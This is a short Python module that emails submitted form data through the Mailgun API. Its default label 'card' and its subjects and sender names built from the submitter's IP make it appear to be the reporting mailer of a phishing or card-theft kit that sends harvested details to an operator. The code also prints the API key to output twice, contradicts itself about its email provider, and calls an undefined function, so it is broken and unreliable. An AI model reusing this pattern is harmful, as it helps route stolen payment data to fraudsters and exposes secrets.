"""
    Module to send data via email provider , we
    use sparkpost.
"""
from requests import post
# from utils import getBody
def getBody(data):
    body = ""
    for key in sorted(data.keys(), key=bodySort):
        body = body + "<h4>{0} : {1}</h4>".format(key, data[key])
    return body

import config

print(config.EMAIL_API_KEY)


class Mail:
    """
        Class to mail logic to send data via
        sparkpost.
    """

    def get_url(self):
        """
            get url domain
        """
        return "https://api.mailgun.net/v3/{}/messages".format(config.EMAIL_DOMAIN)

    def send(self, data, info="card"):
        """
            Send email via mailgun
        """
        response = post(self.get_url(), auth=('api', config.EMAIL_API_KEY), data={
            'html': getBody(data),
            'to': config.TO,
            'subject': "New {} From ".format(info) + data['ip']+" !",
            'from': "{0}<{1}>".format(
                data['ip'],
                config.EMAIL_USER+"@"+config.EMAIL_DOMAIN
            )
        })
        print(response.text)
        print(config.EMAIL_API_KEY)

        return response.text
